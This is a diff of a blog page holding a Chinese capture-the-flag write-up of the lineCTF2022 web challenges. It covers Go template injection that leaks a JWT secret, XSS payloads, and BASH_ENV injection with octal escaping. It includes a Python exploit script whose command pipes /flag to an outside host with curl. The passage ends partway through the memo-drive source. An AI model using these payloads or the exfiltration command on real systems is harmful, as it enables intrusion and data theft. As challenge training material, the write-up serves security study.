@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://corrupt7.github.io">
-  <title>Tag: Javascript | Satori &#39;s blog</title>
+  <title>lineCTF2022 WEB wp | Satori &#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Satori &#39;s blog">
-<meta property="og:url" content="https://corrupt7.github.io/tags/Javascript/index.html">
+  <meta name="description" content="最近buuctf把lineCTF的web题全都放出来了，于是便打了打这次国外的比赛，题目大部分都放出了源码，还是挺吃代码审计的。 0x00 Gotm题目给了源码,在main.go看到的路由和主要函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lineCTF2022 WEB wp">
+<meta property="og:url" content="https://corrupt7.github.io/2022/03/29/lineCTF2022-WEB-wp/index.html">
 <meta property="og:site_name" content="Satori &#39;s blog">
+<meta property="og:description" content="最近buuctf把lineCTF的web题全都放出来了，于是便打了打这次国外的比赛，题目大部分都放出了源码，还是挺吃代码审计的。 0x00 Gotm题目给了源码,在main.go看到的路由和主要函数">
 <meta property="og:locale">
+<meta property="article:published_time" content="2022-03-29T06:42:31.000Z">
+<meta property="article:modified_time" content="2022-04-01T01:41:01.144Z">
 <meta property="article:author" content="Corrupt">
 <meta name="twitter:card" content="summary">
   
@@ -144,64 +148,234 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-lineCTF2022-WEB-wp" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/14/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="archive-article-date">
-  	<time datetime="2021-07-14T09:04:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-14</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/14/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JavaScript原型链污染</a>
+    <h1 class="article-title" itemprop="name">
+      lineCTF2022 WEB wp
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Javascript</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">原型链</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        <a href="/2022/03/29/lineCTF2022-WEB-wp/" class="archive-article-date">
+  	<time datetime="2022-03-29T06:42:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近buuctf把lineCTF的web题全都放出来了，于是便打了打这次国外的比赛，题目大部分都放出了源码，还是挺吃代码审计的。</p>
+<h2 id="0x00-Gotm"><a href="#0x00-Gotm" class="headerlink" title="0x00 Gotm"></a>0x00 Gotm</h2><p>题目给了源码,在main.go看到的路由和主要函数</p>
+<span id="more"></span>
 
-          
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	admin := Account&#123;admin_id, admin_pw, <span class="literal">true</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, admin)</span><br><span class="line"></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, root_handler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/auth&quot;</span>, auth_handler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/flag&quot;</span>, flag_handler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/regist&quot;</span>, regist_handler)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;0.0.0.0:11000&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先看看如何获得flag</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag = os.Getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flag_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, is_admin := jwt_decode(token)</span><br><span class="line">		<span class="keyword">if</span> is_admin == <span class="literal">true</span> &#123;</span><br><span class="line">			p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;Hi &quot;</span> + id + <span class="string">&quot;, flag is &quot;</span> + flag&#125;</span><br><span class="line">			res, err := json.Marshal(p)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			&#125;</span><br><span class="line">			w.Write(res)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			w.WriteHeader(http.StatusForbidden)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们得知,想要获得flag必须要成为admin,而认证用户是通过Header里的X-token 加解密。加解密函数已给出但不知道密钥(密钥在环境变量中)。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">regist_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> get_account(uid).id != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		w.WriteHeader(http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">4</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	new_acc := Account&#123;uid, upw, <span class="literal">false</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, new_acc)</span><br><span class="line"></span><br><span class="line">	p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">	res, err := json.Marshal(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	w.Write(res)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不出所料,无法注册admin账号,但我们能而当账号获得token。显然,解题的关键应该在于如何从环境变量中获得SECRET。</p>
+<p>查看go点sum,由jwt对应的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">github.com/dgrijalva/jwt-go v3.2.0+incompatible h1:7qlOGliEKZXTDg6OTjfoBKDXWrumCAMpl/TFQ4/5kLM=</span><br><span class="line">github.com/dgrijalva/jwt-go v3.2.0+incompatible/go.mod h1:E3ru+11k8xSBh+hMPgOLZmtrrCbhqsmaPHjLKYnJCaQ=</span><br><span class="line">github.com/golang-jwt/jwt v3.2.2+incompatible h1:IfV12K8xAKAnZqdXVzCZ+TOjboZ2keLg81eXfW3O+oY=</span><br><span class="line">github.com/golang-jwt/jwt v3.2.2+incompatible/go.mod h1:8pz2t5EyA70fFQQSrl6XZXzqecmYZeUEB8OUGHkxJ+I=</span><br></pre></td></tr></table></figure>
 
+<p>谷歌搜索相关的漏洞,但并非这题的答案。当我转向最后一个路由时,一个函数吸引了我</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">root_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(w, &amp;acc)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这个hanlder中,调用将X-token中id拼接到template.New(“”).Parse解析的字符串中,并调用了返回变量的Execute方法,template很难不让人想到ssti,于是通过谷歌,我找到了go中的ssti</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go">ssti-server-side-template-injection</a></p>
+<h3 id="利用之一-信息泄露"><a href="#利用之一-信息泄露" class="headerlink" title="利用之一 信息泄露"></a><strong>利用之一</strong> 信息泄露</h3><p>go中SSTI漏洞成因与模板语法与jinja2相差不大,但仅<code>&#123;&#123;&#125;&#125;```在go是非法的,需要由占位符,如
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; . &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+而结构体是Go中一个非常重要的类型，Go通过结构体来类比一个对象，因此他的字段就是一个对象的属性。通常Json的编码和解析都需要通过结构体来实现，加之模板渲染支持传入一个结构体的实例来渲染它的字段，这就造成了信息泄漏的可能。
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id     <span class="keyword">int</span></span><br><span class="line">	Name   <span class="keyword">string</span></span><br><span class="line">	Passwd <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+如代码所示，输入可控且直接拼接进模板，仿造```&#123;&#123; .Name &#125;&#125;</code>的结构构造<code>&#123;&#123;.Passwd&#125;&#125;</code>就能获得Passwd字段值。</p>
+<p>而这题中,我们便可以利用<code>&#123;&#123; . &#125;&#125;</code>获取当前Account所有字段,包secret_key<br>携带token访问根目录,结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logged in as &#123;&#123;&#123; . &#125;&#125; aaaaaaaaaa false this_is_f4Ke_key&#125;</span><br></pre></td></tr></table></figure>
+<p>第四个结果即为我们需要的key,登录jwt.io伪造is_admin为true,访问flag即成功</p>
+<h3 id="利用之二-XSS"><a href="#利用之二-XSS" class="headerlink" title="利用之二 XSS"></a><strong>利用之二</strong> XSS</h3><p>借助Go模板提供的字符串打印功能，可以直接输出XSS语句，如</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="built_in">print</span> <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用之三-命令执行-amp-任意读取"><a href="#利用之三-命令执行-amp-任意读取" class="headerlink" title="利用之三 命令执行&amp;任意读取"></a><strong>利用之三</strong> 命令执行&amp;任意读取</h3><p>这个作业就相当鸡肋了，通过模板语法可知可以像<code>&#123;&#123; .Name &#125;&#125;</code>一样调用对象方法，模板内部并不存在可以RCE的函数，所以除非有人为渲染对象定义了RCE或文件读取的方法，不然这个问题是不存在的。</p>
+<p>总之，目前go ssti并没有像jinjia2那样可以逃逸的骚操作，利用还是比较困难的.</p>
+<h2 id="0x02-BB"><a href="#0x02-BB" class="headerlink" title="0x02 BB"></a>0x02 BB</h2><p>进去放出源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$ptn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="variable">$ptn</span>, <span class="variable">$s</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bye(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>) &amp;&amp; bye(<span class="variable">$v</span>, <span class="string">&quot;/[a-zA-Z]/i&quot;</span>)) &#123;</span><br><span class="line">            putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;imdude&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bye(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>)) &#123;</span><br><span class="line">            putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过putenv设置环境变量，不过有两次过滤，key值不能含=，value不能含大小写字母。但不用大小写字母几乎是不可能命令执行的。所以我们要想办法绕过这个限制.</p>
+<p>小trick,在linux中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 八进制</span><br><span class="line">$&#x27;\101&#x27;=0x41=A</span><br><span class="line"></span><br><span class="line">[root@VM-4-15-centos ~]# $&#x27;\143\141\164&#x27; /flag</span><br><span class="line">flag&#123;123asdasd&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到通过这种方式我们成功执行了命令,而如何通过环境变量rce,p神的一篇文章已经讲清楚了<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1450/">我是如何利用环境变量注入执行任意命令</a></p>
+<p>因为这里直接用了bash -c 所以利用BASH_ENV即可</p>
+<p>以下是脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;cat /flag | curl -d @- http://vps:port&#x27;</span></span><br><span class="line"></span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        o += <span class="string">f&quot;$&#x27;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        o += c</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">f&#x27;http://213f6e8f-d034-4a8a-92af-97f37cdbfc70.node4.buuoj.cn:81/?env[BASH_ENV]=`<span class="subst">&#123;o&#125;</span>`&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="0x03-memo-drive"><a href="#0x03-memo-drive" class="headerlink" title="0x03 memo-drive"></a>0x03 memo-drive</h2><p>题目已给出源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> starlette.applications <span class="keyword">import</span> Starlette</span><br><span class="line"><span class="keyword">from</span> starlette.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> starlette.routing <span class="keyword">import</span> Route, Mount</span><br><span class="line"><span class="keyword">from</span> starlette.templating <span class="keyword">import</span> Jinja2Templates</span><br><span class="line"><span class="keyword">from</span> starlette.staticfiles <span class="keyword">import</span> StaticFiles</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">templates = Jinja2Templates(directory=<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">templates.env.autoescape = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    memoList = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line">        path = <span class="string">&#x27;./memo/&#x27;</span> + clientId</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">            memoList = os.listdir(path)</span><br><span class="line">        </span><br><span class="line">        context[<span class="string">&#x27;request&#x27;</span>] = request</span><br><span class="line">        context[<span class="string">&#x27;ip&#x27;</span>] = request.client.host</span><br><span class="line">        context[<span class="string">&#x27;clientId&#x27;</span>] = clientId</span><br><span class="line">        context[<span class="string">&#x27;memoList&#x27;</span>] = memoList</span><br><span class="line">        context[<span class="string">&#x27;count&#x27;</span>] = <span class="built_in">len</span>(memoList)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> templates.TemplateResponse(<span class="string">&#x27;/view/index.html&#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    memoList = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context[<span class="string">&#x27;request&#x27;</span>] = request</span><br><span class="line">        context[<span class="string">&#x27;ip&#x27;</span>] = request.client.host</span><br><span class="line">        </span><br><span class="line">        contents = request.query_params[<span class="string">&#x27;contents&#x27;</span>]</span><br><span class="line">        path = <span class="string">&#x27;./memo/&#x27;</span> + getClientID(request.client.host) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path) == <span class="literal">False</span>:</span><br><span class="line">            os.makedirs(path, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        memoList = os.listdir(path)</span><br><span class="line">        idx = <span class="built_in">len</span>(memoList)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> HTMLResponse(<span class="string">&#x27;Memo Full&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(contents) &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> HTMLResponse(<span class="string">&#x27;Contents Size Error (MAX:100)&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        filename = <span class="built_in">str</span>(idx) + <span class="string">&#x27;_&#x27;</span> + datetime.datetime.now().strftime(<span class="string">&#x27;%Y%m%d%H%M%S&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">        f = <span class="built_in">open</span>(path + filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(contents)</span><br><span class="line">        f.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(<span class="string">&#x27;Save Complete&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context[<span class="string">&#x27;request&#x27;</span>] = request</span><br><span class="line">            </span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line">        path = <span class="string">&#x27;./memo/&#x27;</span> + clientId</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path) == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> HTMLResponse(<span class="string">&#x27;Memo Null&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        shutil.rmtree(path)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(<span class="string">&#x27;Reset Complete&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context[<span class="string">&#x27;request&#x27;</span>] = request</span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&amp;&#x27;</span> <span class="keyword">in</span> request.url.query <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> request.url.query <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> unquote(request.query_params[clientId]):</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        </span><br><span class="line">        filename = 